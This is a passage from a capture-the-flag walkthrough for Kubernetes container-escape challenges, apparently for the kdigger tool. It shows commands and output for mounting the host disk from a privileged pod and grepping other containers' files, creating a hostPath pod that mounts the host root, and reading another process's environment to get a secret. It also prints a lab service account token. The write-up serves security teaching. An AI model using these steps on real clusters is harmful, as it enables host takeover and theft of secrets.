|           |                                 |            | ad4e3614574582986f1ff5e7d24cdb7 |
|           |                                 |            | 9a76a74a/diff,workdir=/var/lib/ |
|           |                                 |            | docker/overlay2/2a723530920ca6a |
|           |                                 |            | c1a6b05d28ad4e3614574582986f1ff |
|           |                                 |            | 5e7d24cdb79a76a74a/work         |
| proc      | /proc                           | proc       | rw,nosuid,nodev,noexec,relatime |
| tmpfs     | /dev                            | tmpfs      | rw,nosuid,size=65536k,mode=755  |
| devpts    | /dev/pts                        | devpts     | rw,nosuid,noexec,relatime,gid=5 |
|           |                                 |            | ,mode=620,ptmxmode=666          |
| sysfs     | /sys                            | sysfs      | rw,nosuid,nodev,noexec,relatime |
| tmpfs     | /sys/fs/cgroup                  | tmpfs      | rw,nosuid,nodev,noexec,relatime |
|           |                                 |            | ,mode=755                       |
| cgroup    | /sys/fs/cgroup/systemd          | cgroup     | rw,nosuid,nodev,noexec,relatime |
|           |                                 |            | ,xattr,release_agent=/usr/lib/s |
|           |                                 |            | ystemd/systemd-cgroups-agent,na |
|           |                                 |            | me=systemd                      |
| cgroup    | /sys/fs/cgroup/cpuset           | cgroup     | rw,nosuid,nodev,noexec,relatime |
|           |                                 |            | ,cpuset                         |
| cgroup    | /sys/fs/cgroup/net_cls,net_prio | cgroup     | rw,nosuid,nodev,noexec,relatime |
|           |                                 |            | ,net_cls,net_prio               |
| cgroup    | /sys/fs/cgroup/cpu,cpuacct      | cgroup     | rw,nosuid,nodev,noexec,relatime |
|           |                                 |            | ,cpu,cpuacct                    |
| cgroup    | /sys/fs/cgroup/hugetlb          | cgroup     | rw,nosuid,nodev,noexec,relatime |
|           |                                 |            | ,hugetlb                        |
| cgroup    | /sys/fs/cgroup/pids             | cgroup     | rw,nosuid,nodev,noexec,relatime |
|           |                                 |            | ,pids                           |
| cgroup    | /sys/fs/cgroup/memory           | cgroup     | rw,nosuid,nodev,noexec,relatime |
|           |                                 |            | ,memory                         |
| cgroup    | /sys/fs/cgroup/blkio            | cgroup     | rw,nosuid,nodev,noexec,relatime |
|           |                                 |            | ,blkio                          |
| cgroup    | /sys/fs/cgroup/devices          | cgroup     | rw,nosuid,nodev,noexec,relatime |
|           |                                 |            | ,devices                        |
| cgroup    | /sys/fs/cgroup/freezer          | cgroup     | rw,nosuid,nodev,noexec,relatime |
|           |                                 |            | ,freezer                        |
| cgroup    | /sys/fs/cgroup/perf_event       | cgroup     | rw,nosuid,nodev,noexec,relatime |
|           |                                 |            | ,perf_event                     |
| mqueue    | /dev/mqueue                     | mqueue     | rw,nosuid,nodev,noexec,relatime |
| /dev/sda1 | /dev/termination-log            | ext4       | rw,relatime                     |
| /dev/sda1 | /root/.scripts                  | ext4       | ro,relatime                     |
| /dev/sda1 | /etc/resolv.conf                | ext4       | rw,relatime                     |
| /dev/sda1 | /etc/hostname                   | ext4       | rw,relatime                     |
| /dev/sda1 | /etc/hosts                      | ext4       | rw,relatime                     |
| shm       | /dev/shm                        | tmpfs      | rw,nosuid,nodev,noexec,relatime |
|           |                                 |            | ,size=65536k                    |
| tmpfs     | /run/secrets/kubernetes.io/serv | tmpfs      | ro,relatime,size=2033280k       |
|           | iceaccount                      |            |                                 |
+-----------+---------------------------------+------------+---------------------------------+
```

You can even perform a scan of the authorized syscalls with:
```console
# kdigger dig sys -a
### SYSCALLS ###
Comment: [RT_SIGRETURN SELECT PAUSE PSELECT6 PPOLL WAITID EXIT EXIT_GROUP CLONE FORK VFORK SECCOMP PTRACE VHANGUP] were not scanned because they cause hang or for obvious reasons.
+----------+--------------------------------------------------------------------+
|  BLOCKED |                               ALLOWED                              |
+----------+--------------------------------------------------------------------+
| [SETSID] | [BRK READ WRITE OPEN CLOSE STAT FSTAT LSTAT POLL LSEEK MMAP        |
|          | MPROTECT MUNMAP UNAME RT_SIGACTION RT_SIGPROCMASK IOCTL PREAD64    |
|          | PWRITE64 READV WRITEV ACCESS PIPE SCHED_YIELD MREMAP MSYNC MINCORE |
|          | MADVISE SHMGET SHMAT SHMCTL DUP DUP2 NANOSLEEP GETITIMER ALARM     |
|          | SETITIMER GETPID SENDFILE RSEQ LGETXATTR FGETXATTR LISTXATTR       |
|          | LLISTXATTR FLISTXATTR REMOVEXATTR LREMOVEXATTR FREMOVEXATTR TKILL  |
|          | TIME FUTEX SCHED_SETAFFINITY SCHED_GETAFFINITY SET_THREAD_AREA     |
|          | IO_SETUP IO_DESTROY IO_GETEVENTS IO_SUBMIT IO_CANCEL               |
|          | GET_THREAD_AREA LOOKUP_DCOOKIE EPOLL_CREATE EPOLL_CTL_OLD          |
|          | EPOLL_WAIT_OLD REMAP_FILE_PAGES GETDENTS64 SET_TID_ADDRESS         |
|          | RESTART_SYSCALL SEMTIMEDOP FADVISE64 TIMER_CREATE TIMER_SETTIME    |
|          | TIMER_GETTIME TIMER_GETOVERRUN TIMER_DELETE CLOCK_SETTIME          |
|          | CLOCK_GETTIME CLOCK_GETRES CLOCK_NANOSLEEP EPOLL_WAIT EPOLL_CTL    |
|          | TGKILL UTIMES VSERVER MBIND SET_MEMPOLICY GET_MEMPOLICY MQ_OPEN    |
|          | MQ_UNLINK MQ_TIMEDSEND MQ_TIMEDRECEIVE MQ_NOTIFY MQ_GETSETATTR     |
|          | KEXEC_LOAD SEMGET ADD_KEY REQUEST_KEY KEYCTL IOPRIO_SET IOPRIO_GET |
|          | INOTIFY_INIT INOTIFY_ADD_WATCH INOTIFY_RM_WATCH MIGRATE_PAGES      |
|          | OPENAT MKDIRAT MKNODAT FCHOWNAT FUTIMESAT NEWFSTATAT UNLINKAT      |
|          | RENAMEAT LINKAT SYMLINKAT READLINKAT FCHMODAT FACCESSAT UNSHARE    |
|          | SET_ROBUST_LIST GET_ROBUST_LIST SPLICE TEE SYNC_FILE_RANGE         |
|          | VMSPLICE MOVE_PAGES UTIMENSAT EPOLL_PWAIT SIGNALFD TIMERFD_CREATE  |
|          | EVENTFD FALLOCATE TIMERFD_SETTIME TIMERFD_GETTIME ACCEPT4          |
|          | SIGNALFD4 EVENTFD2 EPOLL_CREATE1 DUP3 PIPE2 INOTIFY_INIT1 PREADV   |
|          | PWRITEV RT_TGSIGQUEUEINFO PERF_EVENT_OPEN RECVMMSG FANOTIFY_INIT   |
|          | FANOTIFY_MARK PRLIMIT64 NAME_TO_HANDLE_AT OPEN_BY_HANDLE_AT        |
|          | CLOCK_ADJTIME SYNCFS SEMOP SETNS GETCPU PROCESS_VM_READV           |
|          | PROCESS_VM_WRITEV KCMP FINIT_MODULE SCHED_SETATTR SCHED_GETATTR    |
|          | RENAMEAT2 GETRANDOM MEMFD_CREATE BPF EXECVEAT CONNECT ACCEPT       |
|          | USERFAULTFD SENDTO MEMBARRIER RECVFROM MLOCK2 SENDMSG              |
|          | COPY_FILE_RANGE RECVMSG PREADV2 SHUTDOWN PWRITEV2 BIND             |
|          | PKEY_MPROTECT LISTEN PKEY_ALLOC GETSOCKNAME PKEY_FREE STATX        |
|          | GETPEERNAME IO_PGETEVENTS SOCKETPAIR SENDMMSG SETSOCKOPT           |
|          | GETSOCKOPT SEMCTL SHMDT SIGALTSTACK MSGGET EXECVE MSGSND WAIT4     |
|          | MSGRCV KILL MSGCTL FCNTL UTIME FLOCK MKNOD FSYNC USELIB FDATASYNC  |
|          | PERSONALITY TRUNCATE FTRUNCATE GETDENTS GETCWD CHDIR FCHDIR RENAME |
|          | MKDIR USTAT RMDIR CREAT STATFS LINK UNLINK FSTATFS SYSFS SYMLINK   |
|          | GETPRIORITY READLINK SETPRIORITY CHMOD SCHED_SETPARAM FCHMOD       |
|          | SCHED_GETPARAM SCHED_SETSCHEDULER CHOWN SCHED_GETSCHEDULER FCHOWN  |
|          | SCHED_GET_PRIORITY_MAX SCHED_GET_PRIORITY_MIN LCHOWN UMASK         |
|          | SCHED_RR_GET_INTERVAL GETTIMEOFDAY MLOCK MUNLOCK GETRLIMIT         |
|          | MLOCKALL MUNLOCKALL GETRUSAGE SETTIMEOFDAY MODIFY_LDT TIMES GETUID |
|          | PIVOT_ROOT SYSLOG _SYSCTL GETGID PRCTL SETUID ARCH_PRCTL SETGID    |
|          | GETEUID ADJTIMEX GETEGID SETPGID GETPPID SETRLIMIT GETPGRP CHROOT  |
|          | SETREUID SETREGID GETGROUPS SETGROUPS SETRESUID GETRESUID          |
|          | SETRESGID GETRESGID GETPGID SETFSUID SETFSGID GETSID CAPGET CAPSET |
|          | RT_SIGPENDING RT_SIGTIMEDWAIT RT_SIGQUEUEINFO RT_SIGSUSPEND        |
|          | SYSINFO MOUNT UMOUNT2 SWAPON SWAPOFF REBOOT SETHOSTNAME            |
|          | SETDOMAINNAME IOPL IOPERM CREATE_MODULE INIT_MODULE DELETE_MODULE  |
|          | GET_KERNEL_SYMS QUERY_MODULE QUOTACTL NFSSERVCTL GETPMSG PUTPMSG   |
|          | AFS_SYSCALL TUXCALL SECURITY GETTID READAHEAD SETXATTR LSETXATTR   |
|          | FSETXATTR GETXATTR KEXEC_FILE_LOAD ACCT SYNC]                      |
+----------+--------------------------------------------------------------------+
```

All these clues mean that we are running inside a privilege container, the next
step is to try to mount the disk that we just found inside our filesystem and
to grep for the flag!

```console
# mkdir /mnt/sda1
# mount /dev/sda1 /mnt/sda1
```

Note: if you choose to run with the KVM driver, your disk might be called `vda`
instead of `sda`.

Inside this disk partition, we can find a `var` folder, that contains a `lib`
folder. If you remember the script, the idea was to leak information from other
containers running on the same host from this privileged container. What if we
found the Docker overlay2 filesystem that is containing all the files from the
running containers? It's right here in `/mnt/sda1/var/lib/docker/overlay2`!

```console
# grep -nr quarksflag /mnt/sda1/var/lib/docker/overlay2
/mnt/sda1/var/lib/docker/overlay2/b5bf125f57366ec8b2f3db15b9b52f6d2b9e24ad935cbb15d0f8bcd66523d888/diff/tmp/super_secr3t.secured:1:quarksflag{rn3T9mwV2IKePWtETLTpMQ}
```

## Challenge 2

The script also give you some information, you know you have to access the
underlying host and retrieve a secret in the `/root` folder.

Note: you can replay an asciinema of the solution with `asciinema play
demo-challenge2.cast`.

By performing the same actions as previously, you can notice the container is
not privileged or anything.

The idea here is to check for the presence of a Kubernetes service account
token in `/run/secrets/kubernetes.io/serviceaccount/` and check its associated
rights. Fortunately, `kubectl` is installed, so you can check for `kubectl auth
can-i --list` and notice that you can create pod! If there are no further
admission controls, that might give you access to the underlying host!

You can use a pod configured like this one to try to mount the host filesystem
into a new pod:
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: mount_hostfs
spec:
  containers:
  - image: busybox
    command:
      - sleep
      - "31337"
    name: busybox
    volumeMounts:
    - mountPath: /rootfs
      name: rootfs
  volumes:
    - name: rootfs
      hostPath:
        path: /
```

You can now exec into this pod and retrieve the secret:
```console
# kubectl exec -it mount -- /bin/sh
# grep -nr quarksflag /rootfs/root
/rootfs/root/my-little-secret.txt:1:quarksflag{TaHuqyN2yVh9veKE2VcmUw}
```

On this challenge, you also could have used `kdigger` to stop the token and the
rights associated with:
```console
# kdigger dig tk auth -w 120
### TOKEN ###
Comment: A service account token is mounted.
+-----------+--------------------------------------+--------------------------------------+
| NAMESPACE |                 TOKEN                |                  CA                  |
+-----------+--------------------------------------+--------------------------------------+
| default   | eyJhbGciOiJSUzI1NiIsImtpZCI6IkN4UHhX | -----BEGIN CERTIFICATE-----          |
|           | N1QtZU81LURIUERCM3dTSGpTZ3pOaUdOWGNM | MIIDBjCCAe6gAwIBAgIBATANBgkqhkiG9w0B |
|           | YnVFY0hEbnJMblUifQ.eyJhdWQiOlsiaHR0c | AQsFADAVMRMwEQYDVQQDEwptaW5p         |
|           | HM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjL | a3ViZUNBMB4XDTIxMDMyMzE3MDAyMloXDTMx |
|           | mNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjYzM | MDMyMjE3MDAyMlowFTETMBEGA1UE         |
|           | TU1NjEwLCJpYXQiOjE2MzE2MTk2MTAsImlzc | AxMKbWluaWt1YmVDQTCCASIwDQYJKoZIhvcN |
|           | yI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhd | AQEBBQADggEPADCCAQoCggEBAM/6         |
|           | Wx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZ | qEv1HWFmJZf5Y70T06F9+YUgBgVkKUifLIZc |
|           | XJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZ | b8gmjKRgROXHdlcAJHPHs7tZiFQ+         |
|           | WZhdWx0IiwicG9kIjp7Im5hbWUiOiJvcGVyY | YEv28E46k2qdXj61DTWQAK4ztyGguZIYeVkY |
|           | XRvci1yY2UiLCJ1aWQiOiJhM2I2YmI5My1iN | 5oia23s6xFhByyqrHbinjSPqQaxm         |
|           | Tk4LTRlYmEtOTMxNC02NmVkZmI3ZTZhNDIif | xHerNE2ae/opzVJNYAYACdxGRorlRAN0OHS0 |
|           | Swic2VydmljZWFjY291bnQiOnsibmFtZSI6I | lnCk+flWjofLURzobtV54PEzMxov         |
|           | m9wZXJhdG9yIiwidWlkIjoiYWRkYTU1YTMtM | iYoNOkrYVnFe/zryuQPndQmKqElvcz8HC2jY |
|           | zE0OC00YWJiLTkwY2ItODI3MWVhODQ1ZjQ5I | iSikTgdCrrGxXABf+kYxBanp7a0a         |
|           | n0sIndhcm5hZnRlciI6MTYzMTYyMzIxN30sI | LR/KDeD0Lv+xeRcQ8bbDVwUUy6VHif6k7tOs |
|           | m5iZiI6MTYzMTYxOTYxMCwic3ViIjoic3lzd | pyiUWW6uNLAfwZXpzbE6gfdxUx5N         |
|           | GVtOnNlcnZpY2VhY2NvdW50OmRlZmF1bHQ6b | FGQTRNT7QMQy7DaEAJ8CAwEAAaNhMF8wDgYD |
|           | 3BlcmF0b3IifQ.oSmsyUOP0GRGmzeQP17MvG | VR0PAQH/BAQDAgKkMB0GA1UdJQQW         |
|           | A_zv5SG7GSFL61Y18sk9AkjdQnjdv0SRdbKz | MBQGCCsGAQUFBwMCBggrBgEFBQcDATAPBgNV |
|           | MPeoHLH-Hk1GI7ZMlDTxsNuiModoUu4M85ZG | HRMBAf8EBTADAQH/MB0GA1UdDgQW         |
|           | nKgjWIKv3BZAbGTadLK0rjhNRlbAmY5I6uto | BBSPYIvBWy4s6dZE/Xo/fxd8ktn1aDANBgkq |
|           | rXnalmAeStRKvxlL2SUBrH1OSkxd9CUj4tWx | hkiG9w0BAQsFAAOCAQEApTKOMILF         |
|           | aCt-BjfXZ7e8BKC-f7LtVCjtHfRlzzgJOd0Z | 31MOdaMMAF/SEH9QAN/C7vvE2hE/7aWrtZhU |
|           | z61mCbS2Q756BzmD9jbP4UD4OzwNMcGDISyg | tFFFRpnXBz2S4Xu+P1stEzqfHo6g         |
|           | SKYB1IifLLIfMEt_W3mprkRDiWYvE_yDr7dY | AEXJhWe9RAnCVmHhg3hA5405VHYggmR35Wmr |
|           | Cu0IlpI9cOls46LKGwu9OUE5TjVU_DuRZ8ao | CDMqyaBTpix0YnG1SXetYXE8vLnV         |
|           | J0uzVqsjNZFntSO-CtefcqQUjx3e4Srw     | tVHHmszW7y+h4S+ODovnxxI8eMqr7th0wI5G |
|           |                                      | LjZTUnqzPKGt2l8NhqeaukDvbXth         |
|           |                                      | KpjekcEbxkaPDJt8AehuLZ/74qAGijMQOLKq |
|           |                                      | XGuwGKCTf/79PF6ldWCfHKbLpH0r         |
|           |                                      | tcSeGC5MulXMHEFP9ghLtizT3hQxE1c+//jX |
|           |                                      | YxXt7Zw6vurzntOPwZwvmYtcTVnM         |
|           |                                      | hfG5+fdkU2rIIA== -----END            |
|           |                                      | CERTIFICATE-----                     |
+-----------+--------------------------------------+--------------------------------------+
### AUTHORIZATION ###
Comment: Checking current context/token permissions in the "default" namespace.
+----------------------------+----------------------------+----------------+-------------------------+
|          RESOURCES         |       NONRESOURCEURLS      | RESSOURCENAMES |          VERBS          |
+----------------------------+----------------------------+----------------+-------------------------+
| pods                       | []                         | []             | [create get watch list] |
| pods/attach                | []                         | []             | [create]                |
| pods/exec                  | []                         | []             | [create]                |
| selfsubjectaccessreviews.a | []                         | []             | [create]                |
| uthorization.k8s.io        |                            |                |                         |
| selfsubjectrulesreviews.au | []                         | []             | [create]                |
| thorization.k8s.io         |                            |                |                         |
|                            | [/.well-known/openid-confi | []             | [get]                   |
|                            | guration]                  |                |                         |
|                            | [/api/*]                   | []             | [get]                   |
|                            | [/api]                     | []             | [get]                   |
|                            | [/apis/*]                  | []             | [get]                   |
|                            | [/apis]                    | []             | [get]                   |
|                            | [/healthz]                 | []             | [get]                   |
|                            | [/healthz]                 | []             | [get]                   |
|                            | [/livez]                   | []             | [get]                   |
|                            | [/livez]                   | []             | [get]                   |
|                            | [/openapi/*]               | []             | [get]                   |
|                            | [/openapi]                 | []             | [get]                   |
|                            | [/openid/v1/jwks]          | []             | [get]                   |
|                            | [/readyz]                  | []             | [get]                   |
|                            | [/readyz]                  | []             | [get]                   |
|                            | [/version/]                | []             | [get]                   |
|                            | [/version/]                | []             | [get]                   |
|                            | [/version]                 | []             | [get]                   |
|                            | [/version]                 | []             | [get]                   |
| pods/log                   | []                         | []             | [get]                   |
+----------------------------+----------------------------+----------------+-------------------------+
```

And then you can also use the fork I made from a tool named [kubectl
node-shell](https://github.com/mtardy/kubectl-node-shell) to mount all the host
namespace into a new pod. It's already installed in the second challenge pod.
Try it with:
```console
# kubectl node-shell --incluster
No node name was specified, selecting random node
spawning "nsenter-m0qqr4" on a random node
If you don't see a command prompt, try pressing enter.
# grep -nr quarksflag /root
/root/my-little-secret.txt:1:quarksflag{TaHuqyN2yVh9veKE2VcmUw}
```

## Challenge 3

The third challenge script gives you almost no context. It's supposed to be
more difficult and thus you have to search around by yourself to know what to
look for.

The idea is that you check the processes running:
```console
# ps -ef
UID          PID    PPID  C STIME TTY          TIME CMD
65535          1       0  0 11:40 ?        00:00:00 /pause
root           7       0  0 11:40 ?        00:00:00 /bin/bash -c echo "cat /root/.scripts/script.txt" >> /root/.profile; sleep infinity
root          15       7  0 11:40 ?        00:00:00 sleep infinity
root          16       0  0 11:40 ?        00:00:00 /bin/sh -c while true; do sleep 1337; done
root          58       0  0 12:02 pts/0    00:00:00 /bin/bash -l
root          71      16  0 12:02 ?        00:00:00 sleep 1337
root          86      58  0 12:08 pts/0    00:00:00 ps -ef
```

And finding the `/pause` process is a huge hint, it's a process that is in
every pod and that hold the network namespace of the pod. So if we can see
this, it might be because we share de PID namespace with all the containers of
the pod.

You could have found that with `kdigger` also with these buckets:
```console
# kdigger dig ps pidns
### PROCESSES ###
Comment: 7 processes running, systemd not found as the first process
+-----+------+---------+
| PID | PPID |   NAME  |
+-----+------+---------+
|   1 |    0 | pause   |
|   7 |    0 | bash    |
|  15 |    7 | sleep   |
|  16 |    0 | sh      |
|  58 |    0 | bash    |
|  71 |   16 | sleep   |
|  77 |   58 | kdigger |
+-----+------+---------+
### PIDNAMESPACE ###
Comment: the pause process was found, pod might have shareProcessNamespace to true
+--------------+------------+--------------+
| DEVICENUMBER | PAUSEFOUND | KUBELETFOUND |
+--------------+------------+--------------+
|          208 | true       | false        |
+--------------+------------+--------------+
```

You can notice the same things and the `PIDNamespace` bucket's comment give you
more hints to the situation.

By looking at the `ps -ef` output, we can find a `sleep 1337` process, let's
investigate further:
```console
# cat /proc/71/environ
KUBERNETES_PORT=tcp://10.96.0.1:443KUBERNETES_SERVICE_PORT=443HOSTNAME=normal-podSHLVL=1HOME=/rootSUPER_SECRET=quarksflag{xHOEBnHpPtilhwQ8BDtPiA}KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binKUBERNETES_PORT_443_TCP_PORT=443KUBERNETES_PORT_443_TCP_PROTO=tcpKUBERNETES_SERVICE_PORT_HTTPS=443KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443KUBERNETES_SERVICE_HOST=10.96.0.1PWD=/
```

You can spot in the environments variables
`SUPER_SECRET=quarksflag{xHOEBnHpPtilhwQ8BDtPiA}`.
